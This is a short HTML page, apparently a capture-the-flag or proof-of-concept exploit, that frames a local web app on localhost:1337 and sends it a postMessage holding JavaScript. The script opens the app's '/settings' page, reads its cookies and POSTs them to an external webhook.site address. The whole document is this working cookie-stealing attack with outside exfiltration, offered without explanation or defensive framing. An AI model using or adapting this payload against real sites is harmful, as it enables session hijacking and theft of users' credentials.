<body>
  <iframe src="http://localhost:1337/" sandbox="allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox"></iframe>
  <script>
    const frame = document.querySelector('iframe');
    frame.onload = () => frame.contentWindow.postMessage(`(async () => {
      const w = eval.call(this, "window");
      let p = w.open('/settings');
      await new w.Promise(r => w.setTimeout(r, 500));
      const c = p.document.cookie;
      w.fetch("https://webhook.site/c6560158-65d9-4877-8040-964123673650", { method: "POST", body: c });
    })();`, '*');
  </script>
</body>
